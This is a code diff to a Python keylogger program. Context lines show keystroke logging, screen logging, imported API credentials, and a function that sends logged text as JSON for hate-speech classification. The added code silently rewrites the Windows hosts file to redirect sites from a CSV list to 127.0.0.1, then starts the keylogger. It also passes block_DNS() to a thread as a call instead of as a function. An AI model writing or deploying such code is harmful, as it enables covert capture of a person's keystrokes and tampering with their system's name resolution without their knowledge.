@@ -9,8 +9,26 @@ import io                                   # For ScreenLogger
 import psutil as ps                         # For process
 import time                                 # For API
 import credenciais as cr                    # For API
+import threading
 
 SEND_REPORT_EVERY = 30
+
+def block_DNS():
+    import csv
+    path = r"C:\Windows\System32\drivers\etc\hosts"
+    redirect = "127.0.0.1"
+    websites = []
+    with open('../sites.csv') as file:
+        read_csv = csv.reader(file)
+        for row in read_csv:
+            websites.append(row[0])
+    with open(path, 'r+') as file:
+        content = file.read()
+        for site in websites:
+            if site in content:
+                pass
+            else:
+                file.write(redirect + " " + site + "\n")
 
 def isHateSpeech(self):
     dataLogs = json.dumps({"valor": 0, "frase": self.log})
@@ -122,5 +140,6 @@ class Keylogger:
 
 
 if __name__ == "__main__":
+    threading.Thread(target=block_DNS()).start()
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
